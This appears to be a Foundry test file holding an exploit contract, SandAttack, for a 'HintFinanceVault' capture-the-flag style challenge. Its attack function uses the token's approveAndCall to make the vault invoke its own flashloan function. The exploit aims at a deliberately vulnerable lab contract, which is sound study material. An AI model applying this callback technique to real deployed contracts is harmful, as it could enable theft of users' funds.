// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../contracts/Setup.sol";
import "./Common.sol";

interface ISandToken is ERC20Like {
    function approveAndCall(
        address target,
        uint256 amount,
        bytes calldata data
    ) external payable returns (bytes memory);
}

contract SandAttack is AttackBase {
    ISandToken underlying;
    HintFinanceVault vault;

    constructor(ERC20Like _underlying, HintFinanceVault _vault) payable {
        underlying = ISandToken(address(_underlying));
        vault = _vault;
    }

    function attack() public {
        uint256 amount = 0;
        bytes memory call1 = abi.encodeCall(HintFinanceVault.flashloan, (address(underlying), amount, new bytes(0)));
        underlying.approveAndCall(address(vault), 0, call1);
    }
}
